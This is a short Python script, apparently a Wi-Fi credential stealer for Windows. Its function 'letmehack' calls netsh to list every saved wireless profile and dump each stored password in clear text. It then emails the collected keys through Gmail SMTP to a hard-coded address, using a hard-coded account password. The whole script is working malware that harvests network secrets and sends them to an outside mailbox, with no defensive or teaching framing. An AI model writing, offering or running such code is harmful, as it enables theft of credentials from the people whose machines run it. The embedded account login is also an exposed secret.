import subprocess, smtplib, re
def send_mail(email,password,message):
	server = smtplib.SMTP('smtp.gmail.com',587)
	server.starttls()
	server.login(email,password)
	server.sendmail(email,email,message)
	server.quit()	



def letmehack():
	command = "netsh wlan show profile"
	network = subprocess.check_output(command,shell=True)
	network_names = re.findall("(?:Profile\s*:\s)(.*)",network)
	result = ""
	for name in network_names:
		interface = str(name)
		command = 'netsh wlan show profile "{interface}" key=clear'.format(interface=interface)
		current_result = subprocess.check_output(command,shell=True)
		result = result + current_result

	return result

result=letmehack()
send_mail("mailtoaict@gmail.com","Aict@123",result)